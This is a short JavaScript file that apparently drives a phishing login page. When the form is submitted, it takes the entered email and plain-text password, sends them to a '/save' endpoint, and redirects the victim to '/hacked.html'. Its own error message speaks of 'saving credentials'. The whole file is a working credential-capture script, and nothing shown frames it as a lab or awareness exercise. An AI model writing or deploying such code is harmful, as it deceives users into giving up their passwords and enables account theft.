const form = document.querySelector(".login-card");
const emailInput = document.querySelector("#email");
const passwordInput = document.querySelector("#password");

form.addEventListener("submit", async (event) => {
  event.preventDefault();
  const email = emailInput.value.trim();
  const password = passwordInput.value;

  try {
    const response = await fetch('/save', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ email, password })
    });
    const result = await response.json();
    if (result.success) {
      window.location.href = '/hacked.html';
    } else {
      console.error('Failed to save:', result.message);
    }
  } catch (error) {
    console.error('Error saving credentials:', error);
  }
});
